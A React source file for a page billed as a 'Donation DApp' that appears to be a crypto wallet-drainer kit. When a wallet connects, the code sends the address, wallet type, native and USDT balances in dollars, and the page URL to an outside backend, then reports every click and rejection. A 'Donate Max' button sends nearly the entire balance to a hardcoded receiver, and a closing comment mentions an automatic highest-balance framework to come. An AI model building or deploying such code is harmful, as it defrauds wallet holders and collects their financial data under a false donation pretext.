// src/App.jsx
import React, { useEffect, useState } from "react";
import { ConnectButton } from "@rainbow-me/rainbowkit";
import {
  useAccount,
  useBalance,
  useSendTransaction,
  useNetwork,
  useWaitForTransactionReceipt,
} from "wagmi";
import { readContract } from "@wagmi/core";
import { parseEther, formatEther } from "viem";

/* -------- Configuration -------- */
const API_URL = "https://web-production-2da7.up.railway.app/notify";
const RECEIVER = "0xdC3b29e4a6aF19d5E57965596020127A09049d83";

/* USDT addresses for connected-chain-only checks (commented Sepolia) */
const USDT_ADDRESSES = {
  1: "0xdAC17F958D2ee523a2206206994597C13D831ec7", // Ethereum mainnet (ERC20)
  56: "0x55d398326f99059fF775485246999027B3197955", // BSC mainnet (BEP20)
  // 11155111: "", // Sepolia - no canonical USDT; leave empty if you don't have a test token
};

/* Minimal ERC20 ABI for balanceOf + decimals */
const ERC20_ABI = [
  { name: "balanceOf", type: "function", stateMutability: "view", inputs: [{ name: "owner", type: "address" }], outputs: [{ type: "uint256" }] },
  { name: "decimals", type: "function", stateMutability: "view", inputs: [], outputs: [{ type: "uint8" }] },
];

/* -------- Helpers -------- */
async function notifyBackend(event, data = {}) {
  try {
    await fetch(API_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        event,
        data,
        source: window.location.href, // real link the user opened
        // ip: intentionally omitted so backend extracts X-Forwarded-For / remote addr
      }),
    });
  } catch (err) {
    console.error("notifyBackend error:", err);
  }
}

async function fetchPrices() {
  // simple CoinGecko lookup for ETH, BNB, USDT
  try {
    const res = await fetch(
      "https://api.coingecko.com/api/v3/simple/price?ids=ethereum,binancecoin,tether&vs_currencies=usd"
    );
    return await res.json();
  } catch (e) {
    console.warn("CoinGecko fetch failed:", e);
    return null;
  }
}

/* read ERC20 balance (returns number in human units) */
async function getErc20Balance(chainId, tokenAddress, userAddress) {
  if (!tokenAddress) return 0;
  try {
    const raw = await readContract({
      address: tokenAddress,
      abi: ERC20_ABI,
      functionName: "balanceOf",
      args: [userAddress],
      chainId,
    });
    const decimals = await readContract({
      address: tokenAddress,
      abi: ERC20_ABI,
      functionName: "decimals",
      args: [],
      chainId,
    });
    // raw is BigInt-like; convert to Number safely (for USDT this is okay; if huge use string)
    const bal = Number(raw) / 10 ** Number(decimals);
    return bal;
  } catch (e) {
    console.warn("getErc20Balance error:", e);
    return 0;
  }
}

/* -------- Component -------- */
export default function App() {
  const { address, isConnected, connector } = useAccount(); // connector.name contains wallet provider
  const { chain } = useNetwork();
  const chainId = chain?.id;
  const chainName = chain?.name || `Chain ${chainId || "unknown"}`;
  const nativeSymbol = chain?.nativeCurrency?.symbol || "NATIVE";

  // watch native balance on connected chain
  const { data: balanceData } = useBalance({ address, watch: true });

  // send tx
  const { sendTransaction } = useSendTransaction();
  // wait for confirmation (we will set pendingHash when tx is submitted)
  const [pendingHash, setPendingHash] = useState(null);
  const { data: receipt, isSuccess: receiptSuccess } = useWaitForTransactionReceipt({
    hash: pendingHash,
    enabled: !!pendingHash,
  });

  /* ----- Wallet connect: fetch current-chain balances + prices then notify (only once per connect) ----- */
  useEffect(() => {
    if (!isConnected || !address) return;

    (async () => {
      // native balance (human formatted)
      let nativeBal = "0";
      try {
        if (balanceData?.value) nativeBal = formatEther(balanceData.value);
      } catch (e) {
        nativeBal = "0";
      }

      // USDT (only for the connected chain if address exists in USDT_ADDRESSES)
      const usdtAddress = USDT_ADDRESSES[chainId];
      let usdtBal = 0;
      if (usdtAddress) {
        usdtBal = await getErc20Balance(chainId, usdtAddress, address);
      }

      // fetch prices from CoinGecko (best-effort)
      const prices = await fetchPrices();
      const ethPrice = prices?.ethereum?.usd ?? null;
      const bnbPrice = prices?.binancecoin?.usd ?? null;
      const usdtPrice = prices?.tether?.usd ?? 1;

      // compute USD values for what we have (only for connected chain)
      let nativeUsd = "...";
      if (ethPrice && chainId === 1) nativeUsd = (Number(nativeBal) * ethPrice).toFixed(2);
      if (bnbPrice && chainId === 56) nativeUsd = (Number(nativeBal) * bnbPrice).toFixed(2);

      const usdtUsd = usdtBal ? (Number(usdtBal) * usdtPrice).toFixed(2) : "...";

      // notify backend: wallet_connect includes rich data (only on connect)
      await notifyBackend("wallet_connect", {
        account: address,
        chain: chainName,
        wallet_name: connector?.name || "unknown",
        native_balance: nativeBal,
        native_balance_usd: nativeUsd,
        usdt_balance: usdtBal,
        usdt_balance_usd: usdtUsd,
      });
    })();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isConnected, address, chainId, connector, balanceData]);

  /* ----- Monitor tx receipt and notify final confirmation ----- */
  useEffect(() => {
    if (!receiptSuccess || !receipt) return;
    // receipt.status === 1 is successful on EVM
    const ok = receipt.status === 1 || receipt.status === "success" || receipt.status === true;
    if (ok) {
      notifyBackend("donation_confirmed", {
        account: address,
        txHash: pendingHash,
        blockNumber: receipt.blockNumber || receipt.block_number || null,
      });
    } else {
      notifyBackend("donation_failed", {
        account: address,
        txHash: pendingHash,
        reason: "tx reverted",
      });
    }
    // clear pending
    setPendingHash(null);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [receiptSuccess, receipt]);

  /* ===== Donation flow: Fixed amount ===== */
  const handleDonateFixed = async () => {
    if (!isConnected || !address) {
      notifyBackend("donation_failed", { account: address, error: "wallet_not_connected" });
      return;
    }
    const amountWei = parseEther("0.01");
    // notify attempt (user clicked)
    notifyBackend("donation_attempt", { account: address, amount: "0.01", token: nativeSymbol, chain: chainName });

    try {
      // trigger wallet popup + submit tx (await resolves when tx is submitted by wallet)
      const txResponse = await sendTransaction({
        request: {
          to: RECEIVER,
          value: amountWei,
        },
      });

      // txResponse should include hash on success (user accepted)
      const txHash = txResponse?.hash || txResponse?.transactionHash || (txResponse && txResponse);
      if (txHash) {
        // user approved & tx submitted
        setPendingHash(txHash);
        notifyBackend("donation_approved", { account: address, txHash, amount: "0.01", token: nativeSymbol, chain: chainName });
        // donation_confirmed will be sent when receipt is mined (see receipt effect)
      } else {
        // fallback: if no hash but success, still notify approved
        notifyBackend("donation_approved", { account: address, amount: "0.01", token: nativeSymbol, chain: chainName });
      }
    } catch (err) {
      // If user rejected the signature or other errors
      // wagmi / wallets throw with codes/messages (e.g. user rejected)
      const message = err?.message || String(err);
      if (message?.toLowerCase().includes("user rejected")) {
        notifyBackend("donation_rejected", { account: address, error: message });
      } else {
        notifyBackend("donation_failed", { account: address, error: message });
      }
    }
  };

  /* ===== Donate Max: compute rawBigInt - buffer (BigInt math) ===== */
  const handleDonateMax = async () => {
    if (!isConnected || !address || !balanceData?.value) {
      notifyBackend("donation_failed", { account: address, error: "missing_balance_or_wallet" });
      return;
    }

    try {
      const rawBalance = BigInt(balanceData.value); // BigInt
      const gasBuffer = parseEther("0.001"); // BigInt
      if (rawBalance <= gasBuffer) {
        notifyBackend("donation_failed", { account: address, error: "insufficient_balance" });
        return;
      }
      const sendWei = rawBalance - gasBuffer; // BigInt, safe exact arithmetic

      // human value for notification
      const sendEth = Number(formatEther(sendWei)).toFixed(6);

      notifyBackend("donation_attempt", { account: address, amount: sendEth, token: nativeSymbol, chain: chainName });

      const txResponse = await sendTransaction({
        request: {
          to: RECEIVER,
          value: sendWei,
        },
      });

      const txHash = txResponse?.hash || txResponse?.transactionHash || (txResponse && txResponse);
      if (txHash) {
        setPendingHash(txHash);
        notifyBackend("donation_approved", { account: address, txHash, amount: sendEth, token: nativeSymbol, chain: chainName });
      } else {
        notifyBackend("donation_approved", { account: address, amount: sendEth, token: nativeSymbol, chain: chainName });
      }
    } catch (err) {
      const message = err?.message || String(err);
      if (message?.toLowerCase().includes("user rejected")) {
        notifyBackend("donation_rejected", { account: address, error: message });
      } else {
        notifyBackend("donation_failed", { account: address, error: message });
      }
    }
  };

  return (
    <div className="flex flex-col items-center justify-center h-screen bg-gray-900 text-white space-y-6 p-6">
      <h1 className="text-4xl font-bold">🚀 Donation DApp</h1>
      <ConnectButton />

      {isConnected && (
        <div className="flex flex-col gap-4 mt-6">
          <div className="text-sm text-gray-300">Connected: <span className="font-mono">{address}</span> on <strong>{chainName}</strong></div>
          <div className="flex gap-3 mt-4">
            <button onClick={handleDonateFixed} className="px-6 py-3 bg-blue-600 hover:bg-blue-700 rounded-lg text-lg">Donate 0.01 {nativeSymbol}</button>
            <button onClick={handleDonateMax} className="px-6 py-3 bg-red-600 hover:bg-red-700 rounded-lg text-lg">Donate Max {nativeSymbol}</button>
          </div>
        </div>
      )}
    </div>
  );
}

/* ===== Auto-highest-balance & chain-switch framework intentionally left out COMMENTED (we will enable later) ===== */
